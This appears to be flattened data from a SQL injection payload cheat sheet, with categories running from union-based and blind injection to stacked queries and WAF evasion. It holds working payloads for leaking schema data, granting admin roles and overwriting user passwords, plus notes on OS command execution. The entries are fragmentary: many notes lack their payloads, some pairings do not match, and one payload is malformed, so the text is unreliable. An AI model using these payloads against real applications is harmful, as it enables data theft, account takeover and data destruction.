categories.title: Union-Based Injection
categories.description: Extract data by appending UNION SELECT statements to retrieve information from other tables.

items.note: Basic UNION injection to determine column count
Extract user credentials (if column count matches)
Retrieve MySQL version and current user

categories.title: Error-Based Injection
categories.description: Trigger database errors to extract information from error messages.

items.note: MySQL extractvalue() technique to leak database name

items.payload: 1 AND 1=CAST((SELECT COUNT(*) FROM information_schema.columns) AS INT)--

items.note: SQL Server version extraction via error

categories.title: Boolean-Based Blind Injection
categories.description: Infer database content through true/false responses without direct output.

items.payload: 1' AND (SELECT COUNT(*) FROM users WHERE username='admin') > 0--
1' AND CASE WHEN (SELECT COUNT(*) FROM users)>5 THEN 1 ELSE 0 END--

categories.title: Time-Based Blind Injection
categories.description: Exploit time delays to infer query results through response timing.

items.note: Conditional sleep - delays if condition is true

categories.title: Tautology-Based Injection
categories.description: Always-true conditions to bypass authentication or extract entire datasets.

items.note: Tautology with comment to ignore remaining SQL

categories.title: Stacked Queries (Multiple Statements)
categories.description: Execute multiple SQL statements to modify data or system configuration.

items.note: Destructive stacked query (if database allows multiple statements)

items.payload: 1'; UPDATE users SET role='admin' WHERE id=1--

items.note: SQL Server OS command execution (requires permissions)

categories.title: Second-Order / Stored Injection
categories.description: Inject payloads that get stored and executed later (stored XSS in SQL context).

items.note: Payload stored in database, triggered on retrieval

items.payload: '; UPDATE users SET password='hacked' WHERE id=1; /*
1' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()--
items.note: Enumerate all tables in current database
Combine ORDER BY with UNION for column mapping

items.payload: 1' WHERE id IN (SELECT user_id FROM admins)--

categories.title: Encoding & Obfuscation Evasion
categories.description: Bypass filters and WAF protection using encoding techniques.

items.note: MySQL version-specific comment for WAF bypass

categories.description: Exploitation methods specific to MySQL database.
